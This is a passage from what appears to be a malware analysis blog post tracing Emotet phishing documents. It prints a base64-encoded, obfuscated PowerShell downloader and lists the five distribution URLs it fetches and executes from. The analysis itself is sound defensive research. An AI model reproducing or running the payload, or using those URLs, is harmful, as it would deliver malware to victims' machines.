the immediate window:

![1558555163177](https://0xdfimages.gitlab.io/img/1558555163177.png)

As expected, there’s an encoded PowerShell command.

### C2

The c2 are:

    
    
    $ echo JAB3ADgANQA1ADIAMgBfADkAPQAnAGwAOQBfADUAOQAxADcAMAAnADsAJABBADAAOQA2ADkAOQAgAD0AIAAnADIAOQA5ACcAOwAkAEsANgA0ADgAOAAxADkAMAA9ACcAbwAxAF8AOAAyADcANwAnADsAJAB6ADMAMwA1AF8AOQBfADAAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAJwBcACcAKwAkAEEAMAA5ADYAOQA5ACsAJwAuAGUAeABlACcAOwAkAFYAMwA1ADEAMgA3AD0AJwBGADkAXwAwADYAMgAyACcAOwAkAE0ANAA3ADgAMQA3AF8ANwA9ACYAKAAnAG4AZQB3ACcAKwAnAC0AbwBiACcAKwAnAGoAZQBjAHQAJwApACAAbgBlAFQALgB3AGUAYABCAGAAYwBMAEkARQBOAFQAOwAkAEQANwAxADUAMwBfADAAPQAnAGgAdAB0AHAAOgAvAC8AZAByAG0AYQByAGkAbgBzAC4AYwBvAG0ALwBlAG4AZwBsAC8AcABDAEEAZABPAEwAVwBMAEoALwBAAGgAdAB0AHAAOgAvAC8AaAB5AGIAcgBpAGQAYgB1AHMAaQBuAGUAcwBzAHMAbwBsAHUAdABpAG8AbgBzAC4AYwBvAG0ALgBhAHUALwBjAGcAaQAtAGIAaQBuAC8AdAA2AHkAZQAwAGoAXwB3AHkAaABmADQAeQB3AC0AMgAvAEAAaAB0AHQAcAA6AC8ALwBkAHUAcgBhAGsAYgB1AGYAZQBjAGUAbgBnAGUAbABrAG8AeQAuAGMAbwBtAC8AdwBwAC0AaQBuAGMAbAB1AGQAZQBzAC8ARwByAEkAQgBRAFQAbgBvAE8ALwBAAGgAdAB0AHAAOgAvAC8AcABlAHIAZgBvAHIAbQBhAG4AYwBlAHYAaQB0AGEAbABpAHQAeQAuAG4AZQB0AC8AcABhAHIAdABuAGUAcgAvAHIAcQAyAHQAbwB0AHYAXwBiAHIAeQBoAGQAcQBqAGMAMgAtADEANwAzADIAMAAvAEAAaAB0AHQAcAA6AC8ALwB0AG4AcgBrAGUAbgB0AG8AbgBvAGQAZQAuAGMAbwBtAC8AdwBwAC0AYQBkAG0AaQBuAC8AdgB4AGEAbABqAG4AZQBxAF8AZgA5AHYAYwB3AHYAcwB6ADAAMwAtADAAMQA1ADgANAA1ADUAMQA5AC8AJwAuAFMAUABMAEkAdAAoACcAQAAnACkAOwAkAEUAOQA2ADIAMgAwAD0AJwB6ADgAMQA5ADcANgAnADsAZgBvAHIAZQBhAGMAaAAoACQAawA0ADUANwAwADgANwAgAGkAbgAgACQARAA3ADEANQAzAF8AMAApAHsAdAByAHkAewAkAE0ANAA3ADgAMQA3AF8ANwAuAGQATwBXAG4ATABvAEEARABmAEkATABFACgAJABrADQANQA3ADAAOAA3ACwAIAAkAHoAMwAzADUAXwA5AF8AMAApADsAJABIADMANgAwADUAMwAyADUAPQAnAEYAMAA4ADQAXwAwADAAJwA7AEkAZgAgACgAKAAuACgAJwBHAGUAdAAtAEkAdABlACcAKwAnAG0AJwApACAAJAB6ADMAMwA1AF8AOQBfADAAKQAuAGwAZQBuAEcAVABIACAALQBnAGUAIAAzADkAOAA4ADgAKQAgAHsALgAoACcASQAnACsAJwBuAHYAbwBrACcAKwAnAGUALQBJAHQAZQBtACcAKQAgACQAegAzADMANQBfADkAXwAwADsAJABmADEAMwA0ADgAOQAzADAAPQAnAFoANABfADEANAAwADcAXwAnADsAYgByAGUAYQBrADsAJABmADEAOAA2ADkAOQA3ADgAPQAnAHIANwBfADIAMwAxACcAfQB9AGMAYQB0AGMAaAB7AH0AfQAkAEcAOABfADQAMwA2AD0AJwB2ADcAXwAxADMAXwA0ADcAJwA= | base64 -d | strings -el | grep -Po "https?://.*?'" | tr '@' '\n'
    http://drmarins.com/engl/pCAdOLWLJ/
    http://hybridbusinesssolutions.com.au/cgi-bin/t6ye0j_wyhf4yw-2/
    http://durakbufecengelkoy.com/wp-includes/GrIBQTnoO/
    http://performancevitality.net/partner/rq2totv_bryhdqjc2-17320/
    http://tnrkentonode.com/wp-admin/vxaljneq_f9vcwvsz03-015845519/'
    

## Conclusion

I was able to take a metadata attribute from the phishing doc and pivot and
find many different docs with different lures that ended up with the same VBA.
I also found some earlier versions, and another doc that may or may not be
related to this activity. Next, I could start to map out the c2 and use
passive dns to look for additional infrastructure. I could also try to find as
many stage two binaries as possible.

I still struggle with how to pull some OLE objects out of a word doc. I’d love
to see solutions I could run from a bash prompt rather than opening in Windows
and getting it from the editor. Please leave a comment if you have ideas.

[« Emotet Doc](/2019/05/21/malware-analysis-unnamed-emotet-doc.html)

[](/2019/05/22/emotet-pivot.html)

